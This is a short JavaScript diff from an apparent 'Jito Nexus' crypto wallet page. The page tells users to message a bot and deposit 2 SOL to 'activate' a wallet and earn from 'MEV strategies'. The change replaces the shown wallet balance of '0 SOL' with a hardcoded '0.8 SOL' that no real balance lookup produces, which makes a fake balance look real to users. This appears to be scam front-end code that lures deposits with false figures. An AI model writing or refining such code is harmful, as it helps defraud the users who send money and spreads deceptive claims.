@@ -144,7 +144,7 @@ function initializeWallet() {
     console.log("Initializing wallet");
     document.getElementById("wallet-instructions").innerHTML = 
         "💼 To activate your Jito Nexus wallet and start earning, head over to our bot and type <strong>/get_wallet</strong>. Deposit 2 SOL to activate your wallet and unlock the power of MEV strategies!";
-    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
+    document.getElementById("wallet-balance").textContent = "Balance: 0.8 SOL";
 }
 
 function updateMyGains() {
